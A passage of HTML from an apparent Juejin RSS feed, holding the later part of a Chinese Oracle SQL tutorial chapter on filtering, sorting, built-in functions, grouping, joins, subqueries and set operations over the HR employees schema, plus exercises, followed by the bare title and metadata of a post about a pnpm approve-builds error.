<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">WHERE</span> salary <span class="hljs-operator">&gt;</span> <span class="hljs-number">10000</span>;
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">WHERE</span> hire_date <span class="hljs-operator">&lt;</span> TO_DATE(<span class="hljs-string">'2000-01-01'</span>, <span class="hljs-string">'YYYY-MM-DD'</span>);

<span class="hljs-comment">-- 大于等于、小于等于</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">WHERE</span> salary <span class="hljs-operator">&gt;=</span> <span class="hljs-number">15000</span>;
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">WHERE</span> salary <span class="hljs-operator">&lt;=</span> <span class="hljs-number">10000</span>;
</code></pre>
<h3 data-id="heading-7">逻辑运算符</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- AND运算符</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">WHERE</span> department_id <span class="hljs-operator">=</span> <span class="hljs-number">60</span> <span class="hljs-keyword">AND</span> salary <span class="hljs-operator">&gt;</span> <span class="hljs-number">8000</span>;

<span class="hljs-comment">-- OR运算符</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">WHERE</span> department_id <span class="hljs-operator">=</span> <span class="hljs-number">60</span> <span class="hljs-keyword">OR</span> department_id <span class="hljs-operator">=</span> <span class="hljs-number">90</span>;

<span class="hljs-comment">-- NOT运算符</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">NOT</span> department_id <span class="hljs-operator">=</span> <span class="hljs-number">90</span>;
</code></pre>
<h3 data-id="heading-8">范围查询</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- BETWEEN...AND...</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">WHERE</span> salary <span class="hljs-keyword">BETWEEN</span> <span class="hljs-number">10000</span> <span class="hljs-keyword">AND</span> <span class="hljs-number">20000</span>;

<span class="hljs-comment">-- IN运算符</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">WHERE</span> department_id <span class="hljs-keyword">IN</span> (<span class="hljs-number">60</span>, <span class="hljs-number">90</span>, <span class="hljs-number">100</span>);

<span class="hljs-comment">-- NOT IN运算符</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">WHERE</span> department_id <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">IN</span> (<span class="hljs-number">60</span>, <span class="hljs-number">90</span>, <span class="hljs-number">100</span>);
</code></pre>
<h3 data-id="heading-9">模糊查询</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- LIKE运算符（%匹配任意字符，_匹配单个字符）</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">WHERE</span> first_name <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'A%'</span>;  <span class="hljs-comment">-- 姓氏以A开头</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">WHERE</span> first_name <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'_a%'</span>; <span class="hljs-comment">-- 第二个字母是a</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">WHERE</span> first_name <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'____'</span>; <span class="hljs-comment">-- 姓氏恰好4个字符</span>

<span class="hljs-comment">-- NOT LIKE运算符</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">WHERE</span> first_name <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'A%'</span>;
</code></pre>
<h3 data-id="heading-10">空值查询</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- IS NULL查询空值</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">WHERE</span> commission_pct <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NULL</span>;

<span class="hljs-comment">-- IS NOT NULL查询非空值</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">WHERE</span> commission_pct <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>;
</code></pre>
<h2 data-id="heading-11">4.3 排序查询</h2>
<p>ORDER BY子句用于对查询结果进行排序。</p>
<h3 data-id="heading-12">单列排序</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 按薪资升序排列（默认）</span>
<span class="hljs-keyword">SELECT</span> first_name, last_name, salary <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> salary;

<span class="hljs-comment">-- 按薪资降序排列</span>
<span class="hljs-keyword">SELECT</span> first_name, last_name, salary <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> salary <span class="hljs-keyword">DESC</span>;

<span class="hljs-comment">-- 按入职日期升序排列</span>
<span class="hljs-keyword">SELECT</span> first_name, last_name, hire_date <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> hire_date;
</code></pre>
<h3 data-id="heading-13">多列排序</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 先按部门编号升序，再按薪资降序</span>
<span class="hljs-keyword">SELECT</span> department_id, first_name, last_name, salary 
<span class="hljs-keyword">FROM</span> employees 
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> department_id <span class="hljs-keyword">ASC</span>, salary <span class="hljs-keyword">DESC</span>;

<span class="hljs-comment">-- 按多个字段排序</span>
<span class="hljs-keyword">SELECT</span> department_id, job_id, first_name, last_name, salary 
<span class="hljs-keyword">FROM</span> employees 
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> department_id, job_id <span class="hljs-keyword">DESC</span>, salary;
</code></pre>
<h3 data-id="heading-14">按列别名排序</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 按计算列排序</span>
<span class="hljs-keyword">SELECT</span> first_name, last_name, salary<span class="hljs-operator">*</span><span class="hljs-number">12</span> <span class="hljs-keyword">AS</span> annual_salary 
<span class="hljs-keyword">FROM</span> employees 
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> annual_salary <span class="hljs-keyword">DESC</span>;
</code></pre>
<h2 data-id="heading-15">4.4 函数使用</h2>
<p>Oracle提供了丰富的内置函数用于数据处理。</p>
<h3 data-id="heading-16">字符函数</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- UPPER函数：转换为大写</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">UPPER</span>(first_name) <span class="hljs-keyword">FROM</span> employees;

<span class="hljs-comment">-- LOWER函数：转换为小写</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">LOWER</span>(last_name) <span class="hljs-keyword">FROM</span> employees;

<span class="hljs-comment">-- INITCAP函数：首字母大写</span>
<span class="hljs-keyword">SELECT</span> INITCAP(email) <span class="hljs-keyword">FROM</span> employees;

<span class="hljs-comment">-- CONCAT函数：连接字符串</span>
<span class="hljs-keyword">SELECT</span> CONCAT(first_name, <span class="hljs-string">' '</span>) <span class="hljs-operator">||</span> last_name <span class="hljs-keyword">AS</span> full_name <span class="hljs-keyword">FROM</span> employees;

<span class="hljs-comment">-- SUBSTR函数：截取子串</span>
<span class="hljs-keyword">SELECT</span> SUBSTR(first_name, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>) <span class="hljs-keyword">FROM</span> employees;

<span class="hljs-comment">-- LENGTH函数：获取字符串长度</span>
<span class="hljs-keyword">SELECT</span> first_name, LENGTH(first_name) <span class="hljs-keyword">FROM</span> employees;

<span class="hljs-comment">-- REPLACE函数：替换字符串</span>
<span class="hljs-keyword">SELECT</span> REPLACE(phone_number, <span class="hljs-string">'.'</span>, <span class="hljs-string">'-'</span>) <span class="hljs-keyword">FROM</span> employees;
</code></pre>
<h3 data-id="heading-17">数值函数</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- ROUND函数：四舍五入</span>
<span class="hljs-keyword">SELECT</span> salary, ROUND(salary<span class="hljs-operator">/</span><span class="hljs-number">7</span>, <span class="hljs-number">2</span>) <span class="hljs-keyword">AS</span> weekly_salary <span class="hljs-keyword">FROM</span> employees;

<span class="hljs-comment">-- TRUNC函数：截断</span>
<span class="hljs-keyword">SELECT</span> salary, TRUNC(salary<span class="hljs-operator">/</span><span class="hljs-number">7</span>) <span class="hljs-keyword">AS</span> weekly_salary <span class="hljs-keyword">FROM</span> employees;

<span class="hljs-comment">-- MOD函数：求余数</span>
<span class="hljs-keyword">SELECT</span> employee_id, <span class="hljs-built_in">MOD</span>(employee_id, <span class="hljs-number">2</span>) <span class="hljs-keyword">AS</span> remainder <span class="hljs-keyword">FROM</span> employees;

<span class="hljs-comment">-- ABS函数：绝对值</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">ABS</span>(<span class="hljs-number">-100</span>) <span class="hljs-keyword">FROM</span> dual;

<span class="hljs-comment">-- CEIL函数：向上取整</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">CEIL</span>(<span class="hljs-number">45.2</span>) <span class="hljs-keyword">FROM</span> dual;

<span class="hljs-comment">-- FLOOR函数：向下取整</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">FLOOR</span>(<span class="hljs-number">45.8</span>) <span class="hljs-keyword">FROM</span> dual;
</code></pre>
<h3 data-id="heading-18">日期函数</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- SYSDATE函数：获取当前日期时间</span>
<span class="hljs-keyword">SELECT</span> SYSDATE <span class="hljs-keyword">FROM</span> dual;

<span class="hljs-comment">-- ADD_MONTHS函数：增加月份</span>
<span class="hljs-keyword">SELECT</span> hire_date, ADD_MONTHS(hire_date, <span class="hljs-number">6</span>) <span class="hljs-keyword">AS</span> review_date <span class="hljs-keyword">FROM</span> employees;

<span class="hljs-comment">-- MONTHS_BETWEEN函数：计算月份差</span>
<span class="hljs-keyword">SELECT</span> first_name, hire_date, 
       ROUND(MONTHS_BETWEEN(SYSDATE, hire_date)) <span class="hljs-keyword">AS</span> months_worked 
<span class="hljs-keyword">FROM</span> employees;

<span class="hljs-comment">-- NEXT_DAY函数：下一个指定星期几</span>
<span class="hljs-keyword">SELECT</span> NEXT_DAY(SYSDATE, <span class="hljs-string">'MONDAY'</span>) <span class="hljs-keyword">FROM</span> dual;

<span class="hljs-comment">-- LAST_DAY函数：月末日期</span>
<span class="hljs-keyword">SELECT</span> LAST_DAY(SYSDATE) <span class="hljs-keyword">FROM</span> dual;

<span class="hljs-comment">-- EXTRACT函数：提取日期部分</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">EXTRACT</span>(<span class="hljs-keyword">YEAR</span> <span class="hljs-keyword">FROM</span> hire_date) <span class="hljs-keyword">AS</span> hire_year <span class="hljs-keyword">FROM</span> employees;
</code></pre>
<h3 data-id="heading-19">转换函数</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- TO_CHAR函数：转换为字符</span>
<span class="hljs-keyword">SELECT</span> TO_CHAR(SYSDATE, <span class="hljs-string">'YYYY-MM-DD HH24:MI:SS'</span>) <span class="hljs-keyword">FROM</span> dual;
<span class="hljs-keyword">SELECT</span> first_name, TO_CHAR(salary, <span class="hljs-string">'$999,999.99'</span>) <span class="hljs-keyword">AS</span> formatted_salary <span class="hljs-keyword">FROM</span> employees;

<span class="hljs-comment">-- TO_NUMBER函数：转换为数值</span>
<span class="hljs-keyword">SELECT</span> TO_NUMBER(<span class="hljs-string">'12345'</span>) <span class="hljs-keyword">FROM</span> dual;

<span class="hljs-comment">-- TO_DATE函数：转换为日期</span>
<span class="hljs-keyword">SELECT</span> TO_DATE(<span class="hljs-string">'2023-12-25'</span>, <span class="hljs-string">'YYYY-MM-DD'</span>) <span class="hljs-keyword">FROM</span> dual;
</code></pre>
<h2 data-id="heading-20">4.5 分组查询</h2>
<p>GROUP BY子句用于将查询结果按指定列分组。</p>
<h3 data-id="heading-21">基本分组</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 按部门分组统计员工数量</span>
<span class="hljs-keyword">SELECT</span> department_id, <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">AS</span> employee_count 
<span class="hljs-keyword">FROM</span> employees 
<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> department_id;

<span class="hljs-comment">-- 按部门分组统计平均薪资</span>
<span class="hljs-keyword">SELECT</span> department_id, <span class="hljs-built_in">AVG</span>(salary) <span class="hljs-keyword">AS</span> avg_salary 
<span class="hljs-keyword">FROM</span> employees 
<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> department_id;
</code></pre>
<h3 data-id="heading-22">多列分组</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 按部门和职位分组</span>
<span class="hljs-keyword">SELECT</span> department_id, job_id, <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">AS</span> employee_count, <span class="hljs-built_in">AVG</span>(salary) <span class="hljs-keyword">AS</span> avg_salary
<span class="hljs-keyword">FROM</span> employees 
<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> department_id, job_id
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> department_id, job_id;
</code></pre>
<h3 data-id="heading-23">HAVING子句</h3>
<p>HAVING子句用于对分组后的结果进行筛选。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 查询员工数量大于5的部门</span>
<span class="hljs-keyword">SELECT</span> department_id, <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">AS</span> employee_count 
<span class="hljs-keyword">FROM</span> employees 
<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> department_id 
<span class="hljs-keyword">HAVING</span> <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-operator">&gt;</span> <span class="hljs-number">5</span>;

<span class="hljs-comment">-- 查询平均薪资大于10000的部门</span>
<span class="hljs-keyword">SELECT</span> department_id, <span class="hljs-built_in">AVG</span>(salary) <span class="hljs-keyword">AS</span> avg_salary 
<span class="hljs-keyword">FROM</span> employees 
<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> department_id 
<span class="hljs-keyword">HAVING</span> <span class="hljs-built_in">AVG</span>(salary) <span class="hljs-operator">&gt;</span> <span class="hljs-number">10000</span>;
</code></pre>
<h3 data-id="heading-24">聚合函数</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- COUNT函数：统计记录数</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">FROM</span> employees;
<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">COUNT</span>(commission_pct) <span class="hljs-keyword">FROM</span> employees;  <span class="hljs-comment">-- 不统计NULL值</span>

<span class="hljs-comment">-- SUM函数：求和</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">SUM</span>(salary) <span class="hljs-keyword">AS</span> total_salary <span class="hljs-keyword">FROM</span> employees;

<span class="hljs-comment">-- AVG函数：平均值</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">AVG</span>(salary) <span class="hljs-keyword">AS</span> avg_salary <span class="hljs-keyword">FROM</span> employees;

<span class="hljs-comment">-- MAX函数：最大值</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">MAX</span>(salary) <span class="hljs-keyword">AS</span> max_salary <span class="hljs-keyword">FROM</span> employees;

<span class="hljs-comment">-- MIN函数：最小值</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">MIN</span>(salary) <span class="hljs-keyword">AS</span> min_salary <span class="hljs-keyword">FROM</span> employees;
</code></pre>
<h2 data-id="heading-25">4.6 多表连接查询</h2>
<p>连接查询用于从多个相关表中检索数据。</p>
<h3 data-id="heading-26">内连接（INNER JOIN）</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 显示员工姓名和所属部门名称</span>
<span class="hljs-keyword">SELECT</span> e.first_name, e.last_name, d.department_name
<span class="hljs-keyword">FROM</span> employees e
<span class="hljs-keyword">INNER</span> <span class="hljs-keyword">JOIN</span> departments d <span class="hljs-keyword">ON</span> e.department_id <span class="hljs-operator">=</span> d.department_id;

<span class="hljs-comment">-- 使用传统语法</span>
<span class="hljs-keyword">SELECT</span> e.first_name, e.last_name, d.department_name
<span class="hljs-keyword">FROM</span> employees e, departments d
<span class="hljs-keyword">WHERE</span> e.department_id <span class="hljs-operator">=</span> d.department_id;
</code></pre>
<h3 data-id="heading-27">外连接</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 左外连接（LEFT JOIN）</span>
<span class="hljs-keyword">SELECT</span> e.first_name, e.last_name, d.department_name
<span class="hljs-keyword">FROM</span> employees e
<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> departments d <span class="hljs-keyword">ON</span> e.department_id <span class="hljs-operator">=</span> d.department_id;

<span class="hljs-comment">-- 右外连接（RIGHT JOIN）</span>
<span class="hljs-keyword">SELECT</span> e.first_name, e.last_name, d.department_name
<span class="hljs-keyword">FROM</span> employees e
<span class="hljs-keyword">RIGHT</span> <span class="hljs-keyword">JOIN</span> departments d <span class="hljs-keyword">ON</span> e.department_id <span class="hljs-operator">=</span> d.department_id;

<span class="hljs-comment">-- 全外连接（FULL JOIN）</span>
<span class="hljs-keyword">SELECT</span> e.first_name, e.last_name, d.department_name
<span class="hljs-keyword">FROM</span> employees e
<span class="hljs-keyword">FULL</span> <span class="hljs-keyword">JOIN</span> departments d <span class="hljs-keyword">ON</span> e.department_id <span class="hljs-operator">=</span> d.department_id;
</code></pre>
<h3 data-id="heading-28">自连接</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 查询员工及其管理者信息</span>
<span class="hljs-keyword">SELECT</span> e.first_name <span class="hljs-operator">||</span> <span class="hljs-string">' '</span> <span class="hljs-operator">||</span> e.last_name <span class="hljs-keyword">AS</span> employee,
       m.first_name <span class="hljs-operator">||</span> <span class="hljs-string">' '</span> <span class="hljs-operator">||</span> m.last_name <span class="hljs-keyword">AS</span> manager
<span class="hljs-keyword">FROM</span> employees e
<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> employees m <span class="hljs-keyword">ON</span> e.manager_id <span class="hljs-operator">=</span> m.employee_id;
</code></pre>
<h3 data-id="heading-29">多表连接</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 连接三个表：员工、部门、工作地点</span>
<span class="hljs-keyword">SELECT</span> e.first_name, e.last_name, d.department_name, l.city
<span class="hljs-keyword">FROM</span> employees e
<span class="hljs-keyword">JOIN</span> departments d <span class="hljs-keyword">ON</span> e.department_id <span class="hljs-operator">=</span> d.department_id
<span class="hljs-keyword">JOIN</span> locations l <span class="hljs-keyword">ON</span> d.location_id <span class="hljs-operator">=</span> l.location_id;
</code></pre>
<h2 data-id="heading-30">4.7 子查询</h2>
<p>子查询是嵌套在其他查询中的查询语句。</p>
<h3 data-id="heading-31">单行子查询</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 查询薪资高于平均薪资的员工</span>
<span class="hljs-keyword">SELECT</span> first_name, last_name, salary
<span class="hljs-keyword">FROM</span> employees
<span class="hljs-keyword">WHERE</span> salary <span class="hljs-operator">&gt;</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">AVG</span>(salary) <span class="hljs-keyword">FROM</span> employees);

<span class="hljs-comment">-- 查询与员工100同部门的员工</span>
<span class="hljs-keyword">SELECT</span> first_name, last_name, department_id
<span class="hljs-keyword">FROM</span> employees
<span class="hljs-keyword">WHERE</span> department_id <span class="hljs-operator">=</span> (<span class="hljs-keyword">SELECT</span> department_id <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">WHERE</span> employee_id <span class="hljs-operator">=</span> <span class="hljs-number">100</span>);
</code></pre>
<h3 data-id="heading-32">多行子查询</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 使用IN运算符</span>
<span class="hljs-keyword">SELECT</span> first_name, last_name, department_id
<span class="hljs-keyword">FROM</span> employees
<span class="hljs-keyword">WHERE</span> department_id <span class="hljs-keyword">IN</span> (<span class="hljs-keyword">SELECT</span> department_id <span class="hljs-keyword">FROM</span> departments <span class="hljs-keyword">WHERE</span> location_id <span class="hljs-operator">=</span> <span class="hljs-number">1700</span>);

<span class="hljs-comment">-- 使用ANY运算符</span>
<span class="hljs-keyword">SELECT</span> first_name, last_name, salary
<span class="hljs-keyword">FROM</span> employees
<span class="hljs-keyword">WHERE</span> salary <span class="hljs-operator">&gt;</span> <span class="hljs-keyword">ANY</span> (<span class="hljs-keyword">SELECT</span> salary <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">WHERE</span> department_id <span class="hljs-operator">=</span> <span class="hljs-number">60</span>);

<span class="hljs-comment">-- 使用ALL运算符</span>
<span class="hljs-keyword">SELECT</span> first_name, last_name, salary
<span class="hljs-keyword">FROM</span> employees
<span class="hljs-keyword">WHERE</span> salary <span class="hljs-operator">&gt;</span> <span class="hljs-keyword">ALL</span> (<span class="hljs-keyword">SELECT</span> salary <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">WHERE</span> department_id <span class="hljs-operator">=</span> <span class="hljs-number">60</span>);
</code></pre>
<h3 data-id="heading-33">相关子查询</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 查询每个部门薪资最高的员工</span>
<span class="hljs-keyword">SELECT</span> department_id, first_name, last_name, salary
<span class="hljs-keyword">FROM</span> employees e1
<span class="hljs-keyword">WHERE</span> salary <span class="hljs-operator">=</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">MAX</span>(salary) 
                <span class="hljs-keyword">FROM</span> employees e2 
                <span class="hljs-keyword">WHERE</span> e2.department_id <span class="hljs-operator">=</span> e1.department_id);
</code></pre>
<h2 data-id="heading-34">4.8 集合操作</h2>
<p>集合操作用于合并多个查询结果。</p>
<h3 data-id="heading-35">UNION操作</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 合并两个查询结果（去除重复）</span>
<span class="hljs-keyword">SELECT</span> first_name, last_name <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">WHERE</span> department_id <span class="hljs-operator">=</span> <span class="hljs-number">60</span>
<span class="hljs-keyword">UNION</span>
<span class="hljs-keyword">SELECT</span> first_name, last_name <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">WHERE</span> department_id <span class="hljs-operator">=</span> <span class="hljs-number">90</span>;
</code></pre>
<h3 data-id="heading-36">UNION ALL操作</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 合并两个查询结果（保留重复）</span>
<span class="hljs-keyword">SELECT</span> first_name, last_name <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">WHERE</span> department_id <span class="hljs-operator">=</span> <span class="hljs-number">60</span>
<span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span>
<span class="hljs-keyword">SELECT</span> first_name, last_name <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">WHERE</span> department_id <span class="hljs-operator">=</span> <span class="hljs-number">90</span>;
</code></pre>
<h3 data-id="heading-37">INTERSECT操作</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 返回两个查询结果的交集</span>
<span class="hljs-keyword">SELECT</span> department_id <span class="hljs-keyword">FROM</span> departments <span class="hljs-keyword">WHERE</span> location_id <span class="hljs-operator">=</span> <span class="hljs-number">1700</span>
<span class="hljs-keyword">INTERSECT</span>
<span class="hljs-keyword">SELECT</span> department_id <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">WHERE</span> salary <span class="hljs-operator">&gt;</span> <span class="hljs-number">10000</span>;
</code></pre>
<h3 data-id="heading-38">MINUS操作</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 返回第一个查询结果中存在但第二个查询结果中不存在的记录</span>
<span class="hljs-keyword">SELECT</span> department_id <span class="hljs-keyword">FROM</span> departments
MINUS
<span class="hljs-keyword">SELECT</span> department_id <span class="hljs-keyword">FROM</span> employees;
</code></pre>
<h2 data-id="heading-39">4.9 本章小结</h2>
<p>本章详细介绍了Oracle数据库中的基本查询操作，包括SELECT语句的使用、WHERE条件筛选、排序、函数使用、分组查询、多表连接、子查询和集合操作等。掌握这些查询技能是进行数据分析和报表生成的基础。</p>
<h2 data-id="heading-40">练习题</h2>
<ol>
<li>查询所有员工的姓名、邮箱和薪资，并按薪资降序排列</li>
<li>查询薪资在10000到20000之间的员工信息</li>
<li>查询姓氏以'S'开头的员工</li>
<li>查询没有佣金的员工数量</li>
<li>按部门统计员工数量和平均薪资</li>
<li>查询每个部门薪资最高的员工信息</li>
<li>查询员工姓名及其管理者姓名</li>
<li>使用集合操作查询在部门60或部门90工作但不在部门100工作的员工</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[pnpm approve-builds报错]]></title>    <link>https://juejin.cn/post/7579872561675730953</link>    <guid>https://juejin.cn/post/7579872561675730953</guid>    <pubDate>2025-12-05T02:58:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579872561675730953" data-draft-id="7579906040537481262" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="pnpm approve-builds报错"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-05T02:58:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="mouseliu"/> <meta itemprop="url" content="https://juejin.cn/user/4040060859320432"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            pnpm approve-builds报错
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4040060859320432/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    mouseliu
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T02:58:56.000Z" title="Fri Dec 05 2025 02:58:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
